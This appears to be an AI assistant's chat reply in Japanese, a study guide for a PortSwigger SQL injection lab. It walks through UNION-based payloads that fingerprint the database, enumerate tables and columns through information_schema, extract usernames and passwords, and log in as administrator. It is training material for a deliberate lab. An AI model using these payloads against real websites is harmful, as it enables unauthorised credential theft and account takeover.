了解、和志。  
じゃあ **ラボの全手順＋各コマンドの意味＋DB判別** を  
ひとつの **完全版 Markdown** にまとめる。

必要な情報だけ、無駄なく、実戦で迷わない形にしてある。

---

# 🔥 SQL Injection ラボ完全まとめ（UNION / MySQL 判別つき）

---

# ## 🧩 フェーズ0：まず「このDBは何か？」を判別する

最初は **DBの種類は分からない**。  
だから **DBに依存しない payload** から始める。

### ✔ 判別方法  
`information_schema` が動くかどうか。

```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

### 結果で判別：

| 結果 | DB |
|------|-----|
| **動く（テーブル一覧が出る）** | MySQL / MariaDB / PostgreSQL / SQL Server |
| **500エラーになる** | Oracle（information_schema が存在しない） |

PortSwigger のこのラボは **MySQL 系（MariaDB）**。

---

# ## 🧩 フェーズ1：UNION が通るか確認（列数・型チェック）

まずは **UNION が成立する形**かどうかを確認する。

```
'+UNION+SELECT+'abc','def'--
```

### ✔ 成功条件
- エラーなし（200 OK）
- 画面に **abc / def** が表示される

👉 **2列・文字列型・UNION成功**

---

# ## 🧩 フェーズ2：テーブル一覧を取得（DBの設計図を見る）

```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

### ✔ 探すもの
- `users_xxxxxx`（ランダム名のユーザーテーブル）

👉 **DBの構造を盗み見るステップ**

---

# ## 🧩 フェーズ3：usersテーブルの列名を取得

```
'+UNION+SELECT+column_name,NULL
FROM+information_schema.columns
WHERE+table_name='users_xxxxxx'--
```

### ✔ 確認するもの
- username 系の列名  
- password 系の列名

👉 **どの列に何が入ってるかを特定**

---

# ## 🧩 フェーズ4：ユーザー名とパスワードを抜く（本命）

```
'+UNION+SELECT+username_xxx,password_xxx
FROM+users_xxxxxx--
```

### ✔ 目的
- administrator のパスワードを入手

---

# ## 🧩 フェーズ5：ログインしてクリア

```
/login
```

- username：administrator  
- password：フェーズ4で取得した値

👉 **ラボクリア**

---

# ## 🎯 このラボの本質（ここだけ理解すればOK）

> **UNION で “設計図 → テーブル → 列 → 中身” の順に盗み見る攻撃。**

いきなり users を当てに行かない。  
まず **information_schema** で構造を確認する。

---

# ## 🧠 コマンドの意味（人間語まとめ）

| コマンド | 意味（人間語） |
|---------|----------------|
| `UNION SELECT 'abc','def'` | 2列でUNIONが通るか確認 |
| `information_schema.tables` | DBにあるテーブル名を全部見せろ |
| `information_schema.columns` | そのテーブルの列名を全部見せろ |
| `UNION SELECT username,password FROM users_xxx` | ユーザー情報を全部見せろ |

---

和志、これで **「何をしてるか」「なぜそうするか」「DBは何か」**  
全部一本で理解できるはず。

必要なら、  
- 図解版  
- Burp操作つき版  
- 10秒で読める超短縮版  

どれでも作るよ。
